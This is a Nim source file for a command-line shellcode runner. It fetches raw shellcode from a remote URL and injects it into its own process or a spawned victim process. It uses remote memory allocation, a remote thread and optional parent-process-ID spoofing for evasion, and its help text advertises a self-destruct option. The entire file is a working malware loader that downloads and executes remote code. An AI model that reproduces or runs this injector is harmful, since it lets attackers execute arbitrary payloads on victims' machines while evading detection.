import winim/[lean, winstr, utils]
import std/strformat
import std/[asyncdispatch, httpclient]
import std/strutils

proc getErrorMessage(): tuple[errCode: DWORD, errMsg: string] =
    let errCode = GetLastError()
    var pBuffer = newWString(512)
    FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM or FORMAT_MESSAGE_IGNORE_INSERTS,
                   NULL,
                   errCode,
                   cast[DWORD](MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT)),
                   pBuffer,
                   cast[DWORD](pBuffer.len),
                   NULL);
    nullTerminate(pBuffer)
    var errMsg = %$pBuffer
    return (errCode, strip(errMsg))

proc panic(msg: string, get_err = true) =
    if get_err:
        var (errCode, errMsg) = getErrorMessage()
        echo(fmt"[!] {msg}: (Err: {errCode}) {errMsg}")
    else:
        echo(fmt"[!] {msg}")
    quit(QuitFailure)

proc runnerCreateProcess(target: string, pi: LPPROCESS_INFORMATION, si: LPSTARTUPINFOW | LPSTARTUPINFOEXW, creationFlags: DWORD = 0) =
    let ret = CreateProcessW(NULL,
                             newWideCString(target),
                             NULL,
                             NULL,
                             false,
                             creationFlags,
                             NULL,
                             NULL,
                             cast[LPSTARTUPINFOW](si),
                             pi)
    if ret == 0:
        panic("CreateProcessW")


proc runnerSpawnProcess(target: string, parent: int): PROCESS_INFORMATION =
    var pi: PROCESS_INFORMATION
    if parent > 0:
        var si: STARTUPINFOEXW
        ZeroMemory(&si, sizeof(STARTUPINFOEXW))
        var attributeSize: SIZE_T
        var hParent = OpenProcess(MAXIMUM_ALLOWED, false, cast[DWORD](parent))
        if hParent == 0:
            panic("OpenProcess")

        var ret: WINBOOL
        InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize)
        si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, attributeSize))
        ret = InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
        if ret == 0:
            panic("InitializeProcThreadAttributeList")
        ret = UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);
        if ret == 0:
            panic("UpdateProcThreadAttribute")
        si.StartupInfo.cb = cast[DWORD](sizeof(STARTUPINFOEXW))
        runnerCreateProcess(target, &pi, &si, EXTENDED_STARTUPINFO_PRESENT)
        CloseHandle(hParent)
    else:
        var si: STARTUPINFO
        runnerCreateProcess(target, &pi, &si)
    return pi

proc display(url, target: string, parent: int, kill: bool) =
    echo(fmt"[*] Payload: {url}")
    if target == "":
        echo(fmt"[*] Target: Self-injection")
    else:
        echo(fmt"[*] Target: {target}")
    echo(fmt"[*] PPID Spoofing: {parent}")
    echo(fmt"[*] Kill: {kill}")
    echo()

proc fetch(url: string): Future[string] {.async.} = 
    var client = newAsyncHttpClient()
    try:
        await client.getContent(url)
    except Exception:
        panic(fmt"Unable to fetch {url}: {getCurrentExceptionMsg()}", get_err = false)
        return ""
    finally:
        client.close()

proc runner(url: string, target = "", parent = 0, kill = false) =
    echo("""
                     /\
                ( ;`~v/~~~ ;._
             ,/'""/^) ' < o\  '"".~'\\\--,
           ,/"",/W  u '`. ~  >,._..,   )'
          ,/'  w  ,U^v  ;//^)/')/^\;~)'
       ,/""'/   W` ^v  W |;         )/'
     ;''  |  v' v`"" W }  \\
    ""    .'\    v  `v/^W,) '\)\.)\/)
             `\   ,/,)'   ''')/^""-;'
                  \
                "".
               \    Runner
    """)
    display(url, target, parent, kill)
    echo("[+] Fetching payload asynchronously")
    var futSc = fetch(url)

    var hTarget: HANDLE
    if target != "":
        echo("[+] CreateProcessW")
        var pi = runnerSpawnProcess(target, parent)
        echo(fmt"    PID: {pi.dwProcessId}")
        hTarget = OpenProcess(PROCESS_ALL_ACCESS, false, pi.dwProcessId)
    else:
        hTarget = GetCurrentProcess()

    echo("[+] Waiting for payload to finsih downloading")
    var sc = waitFor futSc
    echo("    Done")

    echo("[+] VirtualAllocEx")
    var baseAddress = VirtualAllocEx(hTarget,
                                     NULL,
                                     sc.len,
                                     MEM_COMMIT or MEM_RESERVE,
                                     PAGE_READWRITE)
    if cast[QWORD](baseAddress) == 0:
        panic("VirtualAllocEx")
    echo(fmt"    Address: {cast[QWORD](baseAddress).toHex}")

    echo("[+] WriteProcessMemory")
    var nbytes: SIZE_T
    var ret: WINBOOL
    ret = WriteProcessMemory(hTarget, baseAddress, &sc, sc.len, &nbytes)
    if ret == 0:
        panic("WriteProcessMemory")
    echo("    Shellcode injected")

    var oldProtect: DWORD
    echo("[+] VirtualProtectEx")
    ret = VirtualProtectEx(hTarget, baseAddress, sc.len, PAGE_EXECUTE_READ, &oldProtect)
    if ret == 0:
        panic("VirtualProtectEx")
    echo("    Changed memory protection")

    echo("[+] CreateRemoteThread")
    var threadId: DWORD
    var hThread = CreateRemoteThread(hTarget, NULL, 0, cast[LPTHREAD_START_ROUTINE](baseAddress), NULL, 0, &threadId)
    echo("    Executing shellcode")

    if target == "":
        echo("[+] WaitForSingleObject")
        echo("    Keeping process alive")
        WaitForSingleObject(hThread, cast[DWORD](0xffffffff))

    echo("[+] Closing handle")
    if hThread != 0:
        CloseHandle(hThread)
        echo("    Closed thread handle")
    if hTarget != 0:
        CloseHandle(hTarget)
        echo("    Closed process handle")

when isMainModule:
    import cligen; dispatch runner, help={
        "url": "Remote URL address for raw shellcode.",
        "target": "Specify the target/victim process. Default: Self-injection",
        "parent": "Spoof victim process under a Parent Process ID (This option is ignored for self-injection)",
        "kill": "Enable self-destruct to auto wipe file from disk.",
        "help": "Display help screen manual",
    }
